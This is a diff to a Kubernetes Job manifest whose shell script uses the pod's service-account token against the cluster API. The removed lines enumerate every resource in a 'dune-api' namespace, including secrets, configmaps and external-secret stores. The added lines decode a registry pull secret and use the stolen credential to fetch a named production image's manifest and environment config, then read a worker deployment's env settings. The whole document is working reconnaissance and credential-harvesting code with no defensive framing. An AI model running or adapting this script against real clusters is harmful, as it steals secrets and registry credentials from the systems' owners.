@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-ns-v1
+  name: dune-img-v1
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -15,59 +15,43 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          apk add -q jq openssl
+          apk add -q jq
           KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
-          DUNE_NS="dune-api"
           
-          echo "=ALL_RESOURCES_IN_DUNE_API="
-          # List all resource types in the namespace
-          for RESOURCE in pods deployments services configmaps secrets serviceaccounts ingresses replicasets jobs cronjobs; do
-            echo "--- $RESOURCE ---"
-            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-              "$API/api/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
-            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-              "$API/apis/apps/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
-            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-              "$API/apis/batch/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
-          done
-          echo "=END_RESOURCES="
+          # Get GCR credentials from gcr-secret in dune-api namespace
+          GCR_SECRET=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/dune-api/secrets/gcr-secret")
+          DOCKER_CONFIG=$(echo "$GCR_SECRET" | jq -r '.data[".dockerconfigjson"]' | base64 -d)
+          echo "Docker config keys: $(echo "$DOCKER_CONFIG" | jq -r '.auths | keys[]')"
           
-          echo "=EXTERNAL_SECRETS="
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/apis/external-secrets.io/v1beta1/namespaces/$DUNE_NS/externalsecrets" | jq '.items[] | {name:.metadata.name, store:.spec.secretStoreRef, data:.spec.data}'
-          echo "=END_ES="
+          # Extract auth for us-central1-docker.pkg.dev
+          GCR_AUTH=$(echo "$DOCKER_CONFIG" | jq -r '.auths["us-central1-docker.pkg.dev"].auth // .auths["https://us-central1-docker.pkg.dev"].auth')
+          echo "GCR auth (first 20): ${GCR_AUTH:0:20}..."
           
-          echo "=SECRET_STORES="
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/apis/external-secrets.io/v1beta1/namespaces/$DUNE_NS/secretstores" | jq .
-          echo "=END_SS="
+          REGISTRY="us-central1-docker.pkg.dev"
+          REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
+          TAG="v0.0.39-alpha.9"
           
-          echo "=CONFIGMAPS="
-          CMS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/$DUNE_NS/configmaps")
-          echo "$CMS" | jq -r '.items[] | "CM: \(.metadata.name)"'
-          echo "$CMS" | jq -r '.items[] | {name:.metadata.name, data:.data}'
-          echo "=END_CM="
+          echo "=GET_MANIFEST="
+          MANIFEST=$(curl -s -H "Authorization: Basic $GCR_AUTH" \
+            -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
+            "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
+          echo "$MANIFEST" | jq '{schemaVersion:.schemaVersion, mediaType:.mediaType, configDigest:.config.digest, layers:.layers | length}'
           
-          # Read all secrets in dune-api (not just list - get content)
-          echo "=SECRETS_CONTENT="
-          SECRETS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/$DUNE_NS/secrets")
-          echo "$SECRETS" | jq -r '.items[] | {name:.metadata.name, keys:(.data|keys), type:.type}'
-          echo "=END_SECRETS_CONTENT="
+          CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest')
+          echo "Config digest: $CONFIG_DIGEST"
+          echo "=END_MANIFEST="
           
-          # Check dune-api deployment spec more carefully
-          echo "=DEPLOYMENT_SPEC="
-          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/apis/apps/v1/namespaces/$DUNE_NS/deployments" | jq '.items[0] | {
-              name:.metadata.name,
-              image:.spec.template.spec.containers[0].image,
-              env:.spec.template.spec.containers[0].env,
-              envFrom:.spec.template.spec.containers[0].envFrom,
-              volumes:.spec.template.spec.volumes,
-              initContainers:.spec.template.spec.initContainers,
-              annotations:.spec.template.metadata.annotations
-            }'
-          echo "=END_DEPLOY="
+          echo "=IMAGE_CONFIG="
+          curl -s -H "Authorization: Basic $GCR_AUTH" \
+            "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | jq '.config | {Env:.Env, Cmd:.Cmd, Entrypoint:.Entrypoint, WorkingDir:.WorkingDir}'
+          echo "=END_CONFIG="
+          
+          # Also get dune-worker image
+          WORKER_DEPLOY=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/apis/apps/v1/namespaces/dune-api/deployments/dune-worker")
+          WORKER_IMAGE=$(echo "$WORKER_DEPLOY" | jq -r '.spec.template.spec.containers[0].image')
+          echo "Worker image: $WORKER_IMAGE"
+          echo "Worker env: $(echo "$WORKER_DEPLOY" | jq '.spec.template.spec.containers[0] | {env:.env, envFrom:.envFrom, volumes:.volumeMounts}')"
